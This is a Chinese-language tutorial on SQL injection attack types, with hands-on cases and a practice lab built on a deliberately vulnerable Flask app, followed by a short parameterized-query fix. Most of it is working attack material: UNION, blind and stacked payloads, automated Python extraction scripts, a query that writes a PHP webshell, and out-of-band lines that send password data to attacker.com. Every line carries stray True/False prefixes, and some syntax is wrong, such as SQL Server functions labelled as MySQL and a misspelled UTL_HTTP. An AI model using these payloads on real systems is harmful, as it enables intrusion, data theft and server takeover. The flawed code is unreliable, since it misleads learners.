# SQL 注入攻击类型与实战 (SQL Injection Attacks & Practice)
 False
 False> @Version: v4.0.0
 False> @Module: mysql
 False
 False> @Author: Anonymous
 False> @Category: MySQL Advanced
 False> @Description: SQL 注入攻击类型详解、实战案例及攻防演练。 | SQL Injection attack types, practical cases, and hands-on exercises.
 False
 False***
 False
 False## 目录
 False
 False1. [SQL 注入攻击类型](#sql-注入攻击类型)
 False2. [SQL 注入实战案例](#sql-注入实战案例)
 False3. [实战演练](#实战演练)
 False
 False***
 False
 False## 1. SQL 注入攻击类型 (Attack Types)
 False
 False### 1.1 带内注入（In-band Injection）
 False
 False带内注入是最常见和最容易实施的 SQL 注入类型，攻击者使用同一通道发送攻击和获取结果。
 False
 False#### 1.1.1 基于错误的注入（Error-based）
 False
 False利用数据库错误信息来获取数据。
 False
 False**MySQL 示例**：
 False
```sql
 True-- 测试注入点
 True?id=1' AND '1'='1 -- 正常
 True?id=1' AND '1'='2 -- 错误
 True
 True-- 通过错误信息获取数据库版本
 True?id=1' AND 1=CONVERT(int, (SELECT @@version)) --
 True
 True-- 通过错误信息获取当前数据库名
 True?id=1' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --
 True
 True-- 通过错误信息获取用户密码哈希
 True?id=1' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users)) --
 True```

 False**SQL Server 示例**：
 False
```sql
 True-- 使用溢出错误获取数据
 True?id=1' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users)) --
 True
 True-- 使用 OPENROWSET 进行带外数据获取
 True?id=1'; SELECT * FROM OPENROWSET('SQLOLEDB', 'Server=attacker;Trusted_Connection=yes', 'SELECT password FROM users') --
 True```

 False#### 1.1.2 UNION 查询注入
 False
 False利用 UNION 操作符将恶意查询结果合并到正常查询中。
 False
 False**前提条件**：
 False
 False- 原查询与恶意查询的列数必须相同
 False- 数据类型必须兼容
 False
 False**攻击步骤**：
 False
```sql
 True-- 1. 确定列数（使用 ORDER BY）
 True?id=1' ORDER BY 1 --
 True?id=1' ORDER BY 2 --
 True?id=1' ORDER BY 3 --
 True?id=1' ORDER BY 4 -- -- 如果报错，说明只有 3 列
 True
 True-- 2. 确定显示位置
 True?id=-1' UNION SELECT 1, 2, 3 --
 True# 观察页面上 1、2、3 哪个位置显示出来了
 True
 True-- 3. 获取数据库信息
 True?id=-1' UNION SELECT 1, database(), version() --
 True?id=-1' UNION SELECT 1, user(), @@version --
 True
 True-- 4. 获取表名
 True?id=-1' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database() --
 True?id=-1' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1 --
 True?id=-1' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database() LIMIT 2,1 --
 True
 True-- 5. 获取列名
 True?id=-1' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users' LIMIT 0,1 --
 True?id=-1' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users' LIMIT 1,1 --
 True
 True-- 6. 获取数据
 True?id=-1' UNION SELECT username, password, email FROM users --
 True?id=-1' UNION SELECT NULL, username, password FROM users --
 True```

 False#### 1.1.3 堆叠查询注入（Stacked Queries）
 False
 False允许在一个查询中执行多条 SQL 语句。
 False
```sql
 True-- MySQL 使用分号分隔多条语句
 True?id=1'; INSERT INTO users (username, password) VALUES ('hacker', '123456'); --
 True
 True-- 删除表
 True?id=1'; DROP TABLE users; --
 True
 True-- 更新数据
 True?id=1'; UPDATE users SET password='hacked' WHERE username='admin'; --
 True
 True-- 获取 shell
 True?id=1'; SELECT * FROM users INTO OUTFILE '/var/www/shell.php'; --
 True
 True-- 延迟后执行（时间盲注结合）
 True?id=1'; SELECT SLEEP(5); --
 True```

 False### 1.2 盲注（Blind Injection）
 False
 False当应用程序不返回数据库错误信息时，攻击者需要通过其他方式推断数据。
 False
 False#### 1.2.1 布尔盲注（Boolean Blind）
 False
 False通过应用程序的响应差异来推断数据。
 False
 False**判断逻辑**：
 False
 False- 如果注入条件为真，页面正常显示
 False- 如果注入条件为假，页面显示不同或报错
 False
```sql
 True-- 1. 判断数据库名长度
 True?id=1' AND LENGTH(database()) = 5 -- -- 如果页面正常，说明长度为 5
 True?id=1' AND LENGTH(database()) > 10 --
 True?id=1' AND LENGTH(database()) < 20 --
 True
 True-- 2. 逐字符猜解数据库名
 True?id=1' AND SUBSTRING(database(), 1, 1) = 'a' --
 True?id=1' AND SUBSTRING(database(), 1, 1) = 'b' --
 True?id=1' AND SUBSTRING(database(), 1, 1) = 'c' --
 True-- ... 继续遍历
 True
 True-- 更高效的方法：使用 ASCII 码
 True?id=1' AND ASCII(SUBSTRING(database(), 1, 1)) > 100 --
 True?id=1' AND ASCII(SUBSTRING(database(), 1, 1)) > 110 --
 True?id=1' AND ASCII(SUBSTRING(database(), 1, 1)) = 116 -- -- 确定第一个字符
 True
 True-- 3. 猜解表名
 True?id=1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1) = 'u' --
 True
 True-- 4. 猜解列名
 True?id=1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 1, 1) = 'i' --
 True
 True-- 5. 猜解数据
 True?id=1' AND SUBSTRING((SELECT password FROM users LIMIT 0,1), 1, 1) = 'a' --
 True?id=1' AND SUBSTRING((SELECT password FROM users LIMIT 0,1), 1, 1) = 'b' --
 True```

 False**自动化脚本**：
 False
```python
 Trueimport requests
 True
 Truedef boolean_blind_injection(url):
 True # 目标 URL
 True target_url = url
 True 
 True # 获取数据库名长度
 True db_name_length = 0
 True for i in range(1, 30):
 True payload = f"1' AND LENGTH(database())={i} -- "
 True response = requests.get(target_url, params={'id': payload})
 True if "正常" in response.text:
 True db_name_length = i
 True print(f"数据库名长度：{i}")
 True break
 True 
 True # 获取数据库名
 True db_name = ""
 True charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
 True for pos in range(1, db_name_length + 1):
 True for char in charset:
 True payload = f"1' AND SUBSTRING(database(), {pos}, 1)='{char}' -- "
 True response = requests.get(target_url, params={'id': payload})
 True if "正常" in response.text:
 True db_name += char
 True print(f"第 {pos} 个字符：{char}")
 True break
 True 
 True print(f"数据库名：{db_name}")
 True return db_name
 True```

 False#### 1.2.2 时间盲注（Time-based）
 False
 False利用数据库延迟函数，通过响应时间来推断数据。
 False
```sql
 True-- MySQL 使用 SLEEP() 函数
 True?id=1' AND SLEEP(5) -- -- 如果页面延迟 5 秒，说明存在注入
 True
 True-- 结合布尔逻辑
 True?id=1' AND IF(LENGTH(database())=5, SLEEP(5), 0) --
 True?id=1' AND IF(SUBSTRING(database(), 1, 1)='a', SLEEP(5), 0) --
 True
 True-- 使用 BENCHMARK() 函数（MySQL）
 True?id=1' AND BENCHMARK(5000000, MD5('a')) --
 True
 True-- 使用 WAIT FOR DELAY（SQL Server）
 True?id=1'; WAIT FOR DELAY '0:0:5' --
 True
 True-- 使用 PG_SLEEP（PostgreSQL）
 True?id=1'; SELECT PG_SLEEP(5) --
 True```

 False**时间盲注脚本**：
 False
```python
 Trueimport requests
 Trueimport time
 True
 Truedef time_based_injection(url):
 True target_url = url
 True 
 True # 测试是否存在注入
 True payload = "1' AND SLEEP(5) -- "
 True start_time = time.time()
 True response = requests.get(target_url, params={'id': payload})
 True end_time = time.time()
 True 
 True if end_time - start_time >= 5:
 True print("存在时间盲注！")
 True else:
 True print("不存在时间盲注")
 True return
 True 
 True # 获取数据库名
 True db_name = ""
 True charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
 True 
 True for pos in range(1, 20):
 True for char in charset:
 True payload = f"1' AND IF(SUBSTRING(database(), {pos}, 1)='{char}', SLEEP(3), 0) -- "
 True start_time = time.time()
 True response = requests.get(target_url, params={'id': payload})
 True end_time = time.time()
 True 
 True if end_time - start_time >= 3:
 True db_name += char
 True print(f"第 {pos} 个字符：{char}")
 True break
 True 
 True if len(db_name) == pos - 1 and pos > 1:
 True break
 True 
 True print(f"数据库名：{db_name}")
 True return db_name
 True```

 False### 1.3 二次注入（Second-order Injection）
 False
 False恶意数据被存储在数据库中，之后在其他查询中被使用时触发注入。
 False
 False**攻击场景**：
 False
 False1. **存储阶段**：攻击者注册用户名 `admin' --`，系统将其存储到数据库
 False2. **触发阶段**：其他功能使用该用户名时，如修改密码的 SQL 查询
 False
```python
 True# 1. 用户注册时输入恶意数据
 Truedef register(username, password):
 True sql = f"INSERT INTO users (username, password) VALUES ('{username}', '{password}')"
 True cursor.execute(sql)
 True # 此时不会触发注入，因为只是插入数据
 True
 True# 2. 存储的数据：username = 'admin' --'
 True
 True# 3. 其他功能使用该数据时触发注入
 Truedef get_user_profile(username):
 True sql = f"SELECT * FROM users WHERE username = '{username}'"
 True cursor.execute(sql)
 True return cursor.fetchone()
 True
 True# 4. 攻击者以 admin' -- 用户名登录后调用 get_user_profile
 True# 会返回真正的 admin 用户信息
 True```

 False**实际案例**：
 False
 FalseWordPress 插件中曾发现过二次注入漏洞，攻击者通过评论功能注入恶意代码，该代码在管理员查看评论时执行。
 False
 False### 1.4 宽字节注入（Wide Byte Injection）
 False
 False利用字符编码漏洞进行注入。
 False
 False**原理**：
 False
 False- 应用程序使用 `addslashes()` 或类似函数转义单引号，添加反斜杠
 False- 如果数据库使用宽字节编码（如 GBK），攻击者可以利用编码特性绕过
 False
```sql
 True-- 场景：应用程序使用 addslashes() 转义单引号
 True-- 但数据库使用 GBK 编码
 True
 True-- 正常输入被转义
 True-- ' 转义为 \'
 True
 True-- 攻击者输入
 True?id=1%df' OR 1=1 --
 True
 True-- 原理分析：
 True-- %df' 会被 addslashes() 转义为 %df\'
 True-- %df\ 在 GBK 编码中会被解释为一个宽字符「運」
 True-- 最终 SQL 变为：WHERE id = 1運' OR 1=1 --
 True-- 单引号闭合了原来的字符串，OR 1=1 使条件永远为真
 True```

 False**防御方法**：
 False
 False- 使用 UTF-8 编码并设置 `character_set_client=binary`
 False- 使用参数化查询而不是字符串拼接
 False
 False### 1.5 联合注入（Union-based Injection）
 False
 False详见 1.1.2 节。
 False
 False### 1.6 带外注入（Out-of-band Injection）
 False
 False当常规渠道（带内）无法获取数据时，使用替代通道。
 False
```sql
 True-- MySQL DNS 通道
 True?id=1' UNION SELECT NULL, (SELECT password FROM users LIMIT 1), NULL INTO OUTFILE '\\\\attacker.com\\share\\output.txt' --
 True
 True-- Oracle UTL_HTTP 带外请求
 True?id=1' AND UTIL_HTTP.REQUEST('http://attacker.com/?data='||password) --
 True
 True-- SQL Server 使用 OPENROWSET
 True?id=1'; SELECT * FROM OPENROWSET('SQLOLEDB', 'Server=attacker;UID=sa;PWD=password', 'SELECT password FROM users') --
 True```

 False## 2. SQL 注入实战案例 (Practical Cases)
 False
 False### 2.1 案例 1：绕过登录验证
 False
 False#### 2.1.1 场景描述
 False
 False一个简单的登录页面，用户输入用户名和密码。
 False
 False#### 2.1.2 危险代码
 False
```php
 True<?php
 True// 危险代码：直接拼接用户输入
 True$username = $_POST['username'];
 True$password = $_POST['password'];
 True
 True$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
 True$result = mysqli_query($conn, $sql);
 True
 Trueif (mysqli_num_rows($result) > 0) {
 True echo "登录成功！";
 True} else {
 True echo "登录失败！";
 True}
 True?>
 True```

 False#### 2.1.3 攻击 Payload
 False
```
 True用户名：admin' --
 True密码：任意值
 True```

 False#### 2.1.4 执行的 SQL
 False
```sql
 TrueSELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
 True```

 False#### 2.1.5 结果分析
 False
 False注释符 `--` 后面的内容被忽略，只验证了 `username = 'admin'`，如果存在 admin 用户，攻击者即可成功登录。
 False
 False#### 2.1.6 其他 Payload 变体
 False
```sql
 True-- 绕过密码验证
 True用户名：admin' OR '1'='1' --
 True密码：任意值
 True
 True-- 利用 UNION 获取其他用户信息
 True用户名：admin' UNION SELECT 1, 'admin', 'password' --
 True密码：任意值
 True
 True-- 使用 1=1 始终为真
 True用户名：' OR 1=1 --
 True密码：任意值
 True```

 False### 2.2 案例 2：UNION 查询获取数据
 False
 False#### 2.2.1 场景描述
 False
 False一个商品详情页面，通过 URL 参数 `id` 获取商品信息。
 False
 False#### 2.2.2 危险代码
 False
```python
 True# 危险代码
 Truedef get_product(product_id):
 True sql = f"SELECT id, name, price FROM products WHERE id = {product_id}"
 True cursor.execute(sql)
 True return cursor.fetchone()
 True```

 False#### 2.2.3 攻击步骤
 False
 False**步骤 1：确定列数**
 False
```
 True?id=1' ORDER BY 1 -- -- 正常
 True?id=1' ORDER BY 2 -- -- 正常
 True?id=1' ORDER BY 3 -- -- 正常
 True?id=1' ORDER BY 4 -- -- 报错，说明只有 3 列
 True```

 False步骤 2：确定显示位置
 False
```
 True?id=-1' UNION SELECT 1, 2, 3 --
 True```

 False步骤 3：获取数据库信息
 False
```
 True?id=-1' UNION SELECT 1, database(), version() --
 True```

 False步骤 4：获取表名
 False
```
 True?id=-1' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database() --
 True```

 False步骤 5：获取列名
 False
```
 True?id=-1' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users' --
 True```

 False步骤 6：获取用户数据
 False
```
 True?id=-1' UNION SELECT username, password, email FROM users --
 True```

 False### 2.3 案例 3：布尔盲注
 False
 False#### 2.3.1 场景描述
 False
 False页面不显示数据库错误，但对不同的输入有不同的响应。
 False
 False#### 2.3.2 攻击脚本
 False
```python
 Trueimport requests
 True
 Truedef blind_injection(url):
 True target_url = url
 True 
 True # 1. 猜解数据库名长度
 True db_name_length = 0
 True for i in range(1, 20):
 True payload = f"1' AND LENGTH(database())={i} -- "
 True response = requests.get(target_url, params={'id': payload})
 True if "正常" in response.text:
 True db_name_length = i
 True break
 True print(f"数据库名长度：{db_name_length}")
 True 
 True # 2. 逐字符猜解数据库名
 True db_name = ""
 True for i in range(1, db_name_length + 1):
 True for c in "abcdefghijklmnopqrstuvwxyz0123456789_":
 True payload = f"1' AND SUBSTRING(database(), {i}, 1)='{c}' -- "
 True response = requests.get(target_url, params={'id': payload})
 True if "正常" in response.text:
 True db_name += c
 True break
 True print(f"数据库名：{db_name}")
 True 
 True return db_name
 True```

 False### 2.4 案例 4：时间盲注
 False
 False#### 2.4.1 攻击脚本
 False
```python
 Trueimport requests
 Trueimport time
 True
 Truedef time_based_injection(url):
 True target_url = url
 True 
 True # 测试是否存在时间盲注
 True start_time = time.time()
 True payload = "1' AND SLEEP(5) -- "
 True response = requests.get(target_url, params={'id': payload})
 True end_time = time.time()
 True 
 True if end_time - start_time >= 5:
 True print("存在时间盲注！")
 True else:
 True print("不存在时间盲注")
 True return
 True 
 True # 猜解数据库名
 True db_name = ""
 True for i in range(1, 20):
 True found = False
 True for c in "abcdefghijklmnopqrstuvwxyz0123456789_":
 True start_time = time.time()
 True payload = f"1' AND IF(SUBSTRING(database(), {i}, 1)='{c}', SLEEP(3), 0) -- "
 True response = requests.get(target_url, params={'id': payload})
 True end_time = time.time()
 True 
 True if end_time - start_time >= 3:
 True db_name += c
 True found = True
 True print(f"找到第 {i} 个字符：{c}")
 True break
 True 
 True if not found:
 True break
 True 
 True print(f"数据库名：{db_name}")
 True return db_name
 True```

 False### 2.5 案例 5：获取服务器 Shell
 False
 False#### 2.5.1 前提条件
 False
 False- MySQL 版本 >= 5.0
 False- 当前用户具有 FILE 权限
 False- Web 目录可写
 False- MySQL 服务账户有执行权限
 False
 False#### 2.5.2 攻击步骤
 False
```sql
 True-- 1. 检查当前用户权限
 True?id=1' UNION SELECT 1, user(), 3 --
 True
 True-- 2. 检查是否具有 FILE 权限
 True?id=1' AND (SELECT COUNT(*) FROM mysql.user WHERE File_priv='Y') > 0 --
 True
 True-- 3. 写入 Webshell
 True?id=1' UNION SELECT 1, '<?php system($_GET["cmd"]); ?>', 3 INTO OUTFILE '/var/www/html/shell.php' --
 True
 True-- 4. 访问 webshell
 Truehttp://target.com/shell.php?cmd=whoami
 True```

 False#### 2.5.3 防御措施
 False
 False- 限制 MySQL 用户的 FILE 权限
 False- Web 目录设置正确的权限
 False- 使用参数化查询
 False
 False## 3. 实战演练 (Hands-on Practice)
 False
 False### 3.1 搭建测试环境
 False
 False#### 3.1.1 创建测试数据库
 False
```sql
 True-- 创建数据库
 TrueCREATE DATABASE sqli_test;
 TrueUSE sqli_test;
 True
 True-- 创建用户表
 TrueCREATE TABLE users (
 True id INT PRIMARY KEY AUTO_INCREMENT,
 True username VARCHAR(50) NOT NULL,
 True password VARCHAR(50) NOT NULL,
 True email VARCHAR(100),
 True role VARCHAR(20) DEFAULT 'user',
 True created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 True);
 True
 True-- 插入测试数据
 TrueINSERT INTO users (username, password, email, role) VALUES
 True('admin', 'admin123', 'admin@example.com', 'admin'),
 True('user1', 'user123', 'user1@example.com', 'user'),
 True('user2', 'user456', 'user2@example.com', 'user');
 True
 True-- 创建商品表
 TrueCREATE TABLE products (
 True id INT PRIMARY KEY AUTO_INCREMENT,
 True name VARCHAR(100) NOT NULL,
 True price DECIMAL(10, 2) NOT NULL,
 True description TEXT,
 True created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 True);
 True
 True-- 插入商品数据
 TrueINSERT INTO products (name, price, description) VALUES
 True('Product 1', 99.99, 'Description 1'),
 True('Product 2', 199.99, 'Description 2'),
 True('Product 3', 299.99, 'Description 3');
 True```

 False#### 3.1.2 创建 Vulnerable Web 应用
 False
```python
 Truefrom flask import Flask, request
 Trueimport pymysql
 True
 Trueapp = Flask(__name__)
 True
 Truedef get_db_connection():
 True return pymysql.connect(
 True host='localhost',
 True user='root',
 True password='password',
 True database='sqli_test'
 True )
 True
 True@app.route('/product')
 Truedef product():
 True product_id = request.args.get('id')
 True 
 True # 危险代码：直接拼接
 True conn = get_db_connection()
 True cursor = conn.cursor()
 True sql = f"SELECT * FROM products WHERE id = {product_id}"
 True cursor.execute(sql)
 True result = cursor.fetchone()
 True conn.close()
 True 
 True return str(result)
 True
 True@app.route('/login', methods=['POST'])
 Truedef login():
 True username = request.form.get('username')
 True password = request.form.get('password')
 True 
 True # 危险代码：直接拼接
 True conn = get_db_connection()
 True cursor = conn.cursor()
 True sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
 True cursor.execute(sql)
 True result = cursor.fetchone()
 True conn.close()
 True 
 True if result:
 True return "Login successful!"
 True else:
 True return "Login failed!"
 True
 Trueif __name__ == '__main__':
 True app.run(debug=True, host='0.0.0.0', port=5000)
 True```

 False### 3.2 攻击演练
 False
 False#### 3.2.1 练习 1：绕过登录
 False
```
 True访问：http://localhost:5000/login
 True提交 POST 请求：
 True- 用户名：admin' --
 True- 密码：任意值
 True```

 False#### 3.2.2 练习 2：UNION 查询
 False
```
 True访问：http://localhost:5000/product?id=-1 UNION SELECT 1, database(), version(), 4
 True```

 False#### 3.2.3 练习 3：获取用户数据
 False
```
 True访问：http://localhost:5000/product?id=-1 UNION SELECT id, username, password, role FROM users
 True```

 False#### 3.2.4 练习 4：时间盲注
 False
```
 True# 测试是否存在注入
 True访问：http://localhost:5000/product?id=1' AND SLEEP(5) --
 True
 True# 如果响应延迟 5 秒，说明存在注入
 True```

 False### 3.3 修复演练
 False
```python
 True@app.route('/product')
 Truedef product_safe():
 True product_id = request.args.get('id')
 True 
 True # 验证输入
 True if not product_id.isdigit():
 True return "Invalid product ID"
 True 
 True # 使用参数化查询
 True conn = get_db_connection()
 True cursor = conn.cursor()
 True sql = "SELECT * FROM products WHERE id = %s"
 True cursor.execute(sql, (product_id,))
 True result = cursor.fetchone()
 True conn.close()
 True 
 True return str(result)
 True
 True@app.route('/login', methods=['POST'])
 Truedef login_safe():
 True username = request.form.get('username')
 True password = request.form.get('password')
 True 
 True # 使用参数化查询
 True conn = get_db_connection()
 True cursor = conn.cursor()
 True sql = "SELECT * FROM users WHERE username = %s AND password = %s"
 True cursor.execute(sql, (username, password))
 True result = cursor.fetchone()
 True conn.close()
 True 
 True if result:
 True return "Login successful!"
 True else:
 True return "Login failed!"
 True```

 False---
 False
 False### 更新日志 (Changelog)
 False
 False- 2026-05-27: 拆分为独立文件，添加元数据，版本升级至 v4.0.0
 False- 2026-05-03: 创建 SQL 注入安全防御文档
 False